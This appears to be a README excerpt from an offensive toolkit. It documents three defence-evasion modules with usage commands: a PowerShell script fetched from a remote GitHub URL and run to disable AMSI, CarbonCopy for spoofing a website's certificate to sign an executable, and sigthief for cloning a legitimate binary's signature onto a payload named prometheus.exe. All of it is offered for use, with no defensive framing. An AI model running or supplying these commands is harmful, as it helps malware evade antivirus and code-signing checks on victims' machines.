## Module Name
   <b><i>AMSBP.ps1</i></b>

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|AMSBP|Disable AMSI within current process|User Land|\*\*\*|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

```powershell
Import-Module -Name ".\AMSBP.ps1" -Force
AMSBP
```


## Module Name
   CarbonCopy

   **Description:**
   <b><i>A tool which creates a spoofed certificate of any online website<br />
   and signs an Executable for AV Evasion. Works for both Windows and Linux</i></b>

   **prerequisites:**
```shell 
apt-get install osslsigncode
pip3 install pyopenssl
```
   **Syntax:**
```python   
python3 CarbonCopy.py www.microsoft.com 443 prometheus.exe signed-prometheus.exe
```

<br />

## Module Name
   sigthief

   **Description:**
   <b><i>A tool to sign Executable for AV Evasion.<br />
   It clones signcheck.exe to sign the new binary</i></b>

   **prerequesites:**
   python3
   osslsigncode

   **Syntax:**
```python   
python Sigthief.py -i "sigcheck.exe" -t "prometheus.exe" -o "signed-prometheus.exe"
```